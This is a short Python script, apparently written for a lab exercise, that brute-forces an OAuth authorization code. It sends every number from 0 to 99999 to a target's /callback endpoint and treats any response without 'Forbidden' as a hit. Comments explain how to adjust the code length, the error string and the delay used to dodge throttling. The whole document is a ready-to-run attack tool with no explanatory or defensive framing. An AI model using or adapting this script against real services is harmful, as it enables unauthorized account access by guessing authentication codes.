import requests, sys, time

def brute():
    try:
        #Adjust if token is more than 7 number long
        value = range(100000)
        for val in value:
            url = sys.argv[1]
            #adjust with the right URL for the OAuth token
            r = requests.get(url + '/callback?code='+str(val))
            #Adjust the error message to match
            if "Forbidden" not in r.text:
                print(" Number found!", val)
                #Avoid throttling by adding a sleep
                time.sleep(20)
            elif r.status_code == 200:
                sys.stdout.write(u"\u001b[1000D")  # Move all the way left
                sys.stdout.write("Tring: " + str(val))
                sys.stdout.flush()
    except IndexError:
        print("Enter a URL E.g.: http://<lab-ip>")

brute()